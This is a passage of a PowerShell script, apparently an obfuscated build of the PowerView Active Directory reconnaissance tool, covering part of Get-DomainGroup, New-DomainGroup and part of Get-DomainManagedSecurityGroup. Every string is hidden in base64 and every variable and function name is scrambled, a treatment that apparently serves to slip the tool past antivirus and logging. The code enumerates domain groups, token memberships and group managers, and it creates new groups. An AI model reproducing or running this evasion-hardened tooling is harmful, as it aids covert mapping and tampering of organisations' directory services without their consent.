        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/\___/\/====\_/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
    }
    PROCESS {
        if (${__/\___/\/====\_/}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIASQBkAGUAbgB0AGkAdAB5AA==')))]) {
                if (${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
                    ${/\______/=\/=\/=\} = ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
                }
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${____/=\_/\/\_/\___}
                ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                ___/\___/\__/===\/ @/=\___/=\__/=\/\/ | % {
                    ${/==\___/\_/\/\_/=} = $_.GetDirectoryEntry()
                    ${/==\___/\_/\/\_/=}.RefreshCache($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABvAGsAZQBuAEcAcgBvAHUAcABzAA=='))))
                    ${/==\___/\_/\/\_/=}.TokenGroups | % {
                        ${/=\/=\_/\___/===\} = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if (${/=\/=\_/\___/===\} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAzADIALQAuACoA')))) {
                            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\/=\_/\___/===\}
                            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $False
                            if (${/\______/=\/=\/=\}) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = ${/\______/=\/=\/=\} }
                            ${___/\__/\_/\_/\__} = ___/\___/\__/===\/ @/=\___/=\__/=\/\/
                            if (${___/\__/\_/\_/\__}) {
                                ${___/\__/\_/\_/\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                                ${___/\__/\_/\_/\__}
                            }
                        }
                    }
                }
            }
            else {
                ${_____/\_/\/=\/=\_} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${___/=\_/\/\__/===} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewBfAF8AXwAvAD0AXABfAC8AXAAvAFwAXwBfAC8APQA9AD0AfQApAA==')))
                    }
                    elseif (${___/=\_/\/\__/===} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${/====\/==\_/=====} = ${___/=\_/\/\__/===}.SubString(${___/=\_/\/\__/===}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AC8APQA9AD0APQBcAC8APQA9AFwAXwAvAD0APQA9AD0APQB9ACcAIABmAHIAbwBtACAAJwAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AJwA=')))
                            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${/====\/==\_/=====}
                            ${__/\___/\/====\_/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                            if (-not ${__/\___/\/====\_/}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsALwA9AD0APQA9AFwALwA9AD0AXABfAC8APQA9AD0APQA9AH0AJwA=')))
                            }
                        }
                    }
                    elseif (${___/=\_/\/\__/===} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${_/==\/\_/==\_/\/=} = (([Guid]${___/=\_/\/\__/===}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAF8ALwBcAC8APQB9ACkA')))
                    }
                    elseif (${___/=\_/\/\__/===}.Contains('\')) {
                        ${________/==\/\/==} = ${___/=\_/\/\__/===}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/=\____/===\/==\ -_/=\/=\/==\/\_/=\_ Canonical
                        if (${________/==\/\/==}) {
                            ${____/\/=\/\/=\___} = ${________/==\/\/==}.SubString(0, ${________/==\/\/==}.IndexOf('/'))
                            ${___/===\/=\___/\/} = ${___/=\_/\/\__/===}.Split('\')[1]
                            ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAXwBfAF8ALwA9AD0APQBcAC8APQBcAF8AXwBfAC8AXAAvAH0AKQA=')))
                            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\/=\/\/=\___}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwBcAC8APQBcAC8AXAAvAD0AXABfAF8AXwB9ACcAIABmAHIAbwBtACAAJwAkAHsAXwBfAF8ALwA9AFwAXwAvAFwALwBcAF8AXwAvAD0APQA9AH0AJwA=')))
                            ${__/\___/\/====\_/} = __/=\/\_/\/=\__/=\ @/=\___/=\__/=\/\/
                        }
                    }
                    else {
                        ${_____/\_/\/=\/=\_} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKABuAGEAbQBlAD0AJAB7AF8AXwBfAC8APQBcAF8ALwBcAC8AXABfAF8ALwA9AD0APQB9ACkAKQA=')))
                    }
                }
                if (${_____/\_/\/=\/=\_} -and (${_____/\_/\/=\/=\_}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8AXwBfAF8ALwBcAF8ALwBcAC8APQBcAC8APQBcAF8AfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGEAZABtAGkAbgBDAG8AdQBuAHQAPQAxAA==')))
                    $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]) {
                    ${_/\_/=\/=\/\/==\/} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]
                    $Filter = Switch (${_/\_/=\/=\/\/==\/}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA0ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwA')))            { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARwBsAG8AYgBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGkAdgBlAHIAcwBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAVQBuAGkAdgBlAHIAcwBhAGwA')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA4ACkAKQA='))) }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHMAYwBvAHAAZQAgACcAJAB7AF8ALwBcAF8ALwA9AFwALwA9AFwALwBcAC8APQA9AFwALwB9ACcA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]) {
                    ${__/==\___/=\_/=\/} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]
                    $Filter = Switch (${__/==\___/=\_/=\/}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))              { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdAByAGkAYgB1AHQAaQBvAG4A')))          { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyADEANAA3ADQAOAAzADYANAA4ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAQwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxACkAKQA='))) }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHAAcgBvAHAAZQByAHQAeQAgACcAJAB7AF8AXwAvAD0APQBcAF8AXwBfAC8APQBcAF8ALwA9AFwALwB9ACcA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${__/\___/\/====\_/}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroup] filter string: $(${__/\___/\/====\_/}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${/==\_/=\____/===\} = ${__/\___/\/====\_/}.FindOne() }
                else { ${/==\_/=\____/===\} = ${__/\___/\/====\_/}.FindAll() }
                ${/==\_/=\____/===\} | ? {$_} | % {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${___/\__/\_/\_/\__} = $_
                    }
                    else {
                        ${___/\__/\_/\_/\__} = ____/=\__/\/=\__/= -Properties $_.Properties
                    }
                    ${___/\__/\_/\_/\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                    ${___/\__/\_/\_/\__}
                }
                if (${/==\_/=\____/===\}) {
                    try { ${/==\_/=\____/===\}.dispose() }
                    catch {
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA=')))
                    }
                }
                ${__/\___/\/====\_/}.dispose()
            }
        }
    }
}
function New-DomainGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/\/\__/=\__/\_/\} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\__/=\__/\_/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${/====\/\/\______/} = ___/\__/===\__/\__ @_/\/\__/=\__/\_/\
    if (${/====\/\/\______/}) {
        ${___/\__/\_/\_/\__} = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList (${/====\/\/\______/}.Context)
        ${___/\__/\_/\_/\__}.SamAccountName = ${/====\/\/\______/}.Identity
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${___/\__/\_/\_/\__}.Name = $Name
        }
        else {
            ${___/\__/\_/\_/\__}.Name = ${/====\/\/\______/}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${___/\__/\_/\_/\__}.DisplayName = $DisplayName
        }
        else {
            ${___/\__/\_/\_/\__}.DisplayName = ${/====\/\/\______/}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${___/\__/\_/\_/\__}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGMAcgBlAGEAdABlACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnAA==')))
        try {
            $Null = ${___/\__/\_/\_/\__}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABjAHIAZQBhAHQAZQBkAA==')))
            ${___/\__/\_/\_/\__}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAOgAgACQAXwA=')))
        }
    }
}
function Get-DomainManagedSecurityGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbQBhAG4AYQBnAGUAZABCAHkAPQAqACkAKABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQApAA==')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACwAbQBhAG4AYQBnAGUAZABCAHkALABzAGEAbQBhAGMAYwBvAHUAbgB0AHQAeQBwAGUALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }
        ___/\/=========\/\ @/=\___/=\__/=\/\/ | % {
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbgBhAG0AZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAdAB5AHAAZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAbgBhAG0AZQAsAG8AYgBqAGUAYwB0AHMAaQBkAA==')))
            ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $_.managedBy
            $Null = ${/=\___/=\__/=\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA='))))
            ${/==\/\_/=\___/=\/} = ___/\___/\__/===\/ @/=\___/=\__/=\/\/
            ${_/=\_/=====\_/\/=} = New-Object PSObject
            ${_/=\_/=====\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $_.samaccountname
            ${_/=\_/=====\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $_.distinguishedname
            ${_/=\_/=====\_/\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBOAGEAbQBlAA=='))) ${/==\/\_/=\___/=\/}.samaccountname
